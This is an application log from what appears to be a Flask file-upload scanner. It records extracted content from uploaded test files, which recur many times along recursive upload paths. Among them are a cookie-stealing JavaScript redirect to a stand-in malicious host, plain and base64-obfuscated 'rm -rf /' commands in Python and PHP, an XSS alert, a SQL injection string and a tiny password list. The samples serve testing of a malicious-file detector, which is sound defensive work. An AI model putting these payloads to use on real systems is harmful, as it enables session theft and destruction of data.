
2025-02-22 20:46:17,803 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:46:17,804 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:46:17,805 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:46:17,810 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:46:17,811 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:46:17,813 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:46:17,815 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:46:17,816 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:46:17,819 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:46:17,820 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:46:17,821 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:46:17,823 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:46:17,824 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:46:17,825 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:46:17,826 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:46:17,832 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:46:17,833 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:46:17,834 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:46:17,835 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:46:17,836 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:46:17,838 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:46:17,839 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:46:17,840 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:46:17,841 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:46:17,842 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:46:17,843 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:46:17,845 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:46:17,846 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:46:17,847 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:46:17,848 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:46:17,849 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:46:17,850 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:46:17,852 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:46:17,853 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:46:17,854 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:46:17,855 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:46:17,856 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:46:17,857 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:46:17,858 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:46:17,859 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:46:17,860 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:46:17,861 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:46:17,862 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:46:17,863 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:46:17,864 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:46:17,865 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:46:17,866 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:46:17,867 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:46:17,869 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:46:17,870 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:46:17,871 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:46:17,872 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:46:17,873 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:46:17,874 - Extracted content from uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:46:17,875 - Extracted content from uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:46:17,876 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:46:17,877 - Extracted content from uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:46:17,879 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:46:17,880 - Extracted content from uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:46:17,881 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:46:17,883 - Extracted content from uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:46:17,884 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:46:17,888 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 20:46:17,888 - [33mPress CTRL+C to quit[0m
2025-02-22 20:46:23,329 - Extracted content from uploads/1/1.sql: SELECT * FROM users WHERE username = 'admin' OR '1'='1';

2025-02-22 20:46:23,329 - Malicious pattern detected in uploads/1/1.sql
2025-02-22 20:46:23,329 - Moved 1.sql to trash due to suspicious content.
2025-02-22 20:46:23,363 - 127.0.0.1 - - [22/Feb/2025 20:46:23] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 20:46:23,378 - 127.0.0.1 - - [22/Feb/2025 20:46:23] "GET / HTTP/1.1" 200 -
2025-02-22 20:46:29,739 - 127.0.0.1 - - [22/Feb/2025 20:46:29] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 20:46:29,746 - 127.0.0.1 - - [22/Feb/2025 20:46:29] "GET / HTTP/1.1" 200 -
2025-02-22 20:47:56,422 - Extracted content from uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:47:56,427 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:47:56,429 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:47:56,431 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:47:56,433 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:47:56,434 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:47:56,435 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:47:56,436 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:47:56,437 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:47:56,439 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:47:56,445 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:47:56,446 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:47:56,447 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:47:56,449 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:47:56,451 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:47:56,453 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:47:56,455 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:47:56,456 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:47:56,457 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:47:56,458 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:47:56,459 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:47:56,460 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:47:56,466 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:47:56,467 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:47:56,468 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:47:56,471 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:47:56,472 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:47:56,475 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:47:56,476 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:47:56,477 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:47:56,478 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:47:56,479 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:47:56,480 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:47:56,481 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:47:56,487 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
